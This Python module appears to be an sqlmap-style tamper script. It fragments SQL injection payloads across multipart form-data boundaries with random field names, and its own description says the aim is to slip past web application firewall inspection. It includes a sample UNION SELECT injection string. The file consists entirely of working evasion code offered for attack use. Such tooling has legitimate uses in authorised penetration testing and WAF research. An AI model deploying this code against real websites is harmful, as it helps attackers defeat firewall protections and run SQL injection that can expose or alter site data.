import random
import string

__example_payload__ = "' UNION SELECT NULL,NULL--"
__type__ = "multipart form-data fragmentation: hides payload inside multipart boundaries to evade WAF inspection"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    boundary = "----WebKitFormBoundary{}".format(
        ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    )

    n_parts = random.randint(2, 4)
    chunk_size = max(2, len(payload) // n_parts)
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    parts = []
    names = ["q", "id", "search", "query"]
    for i, chunk in enumerate(chunks):
        name = random.choice(names)
        parts.append(
            '--{boundary}\r\n'
            'Content-Disposition: form-data; name="{name}"\r\n'
            '\r\n'
            '{chunk}\r\n'.format(boundary=boundary, name=name, chunk=chunk)
        )
    parts.append('--{}--\r\n'.format(boundary))

    return ''.join(parts)
